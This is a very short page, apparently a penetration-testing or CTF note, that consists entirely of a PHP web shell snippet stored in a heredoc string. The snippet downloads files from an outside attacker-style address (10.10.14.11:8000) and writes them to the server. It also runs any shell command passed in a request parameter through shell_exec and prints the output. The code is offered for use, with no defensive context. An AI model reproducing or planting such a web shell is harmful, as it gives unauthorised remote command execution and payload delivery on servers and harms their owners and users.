Php Snippet for Command Execution

# Php Snippet for Command Execution

```
$php_file_update= <<<'EOD'
<?php 
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.11:8000/", $_REQUEST['fupload'] ));
    };
    if (isset($_REQUEST['fexec'])){
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };
?>
EOD;
```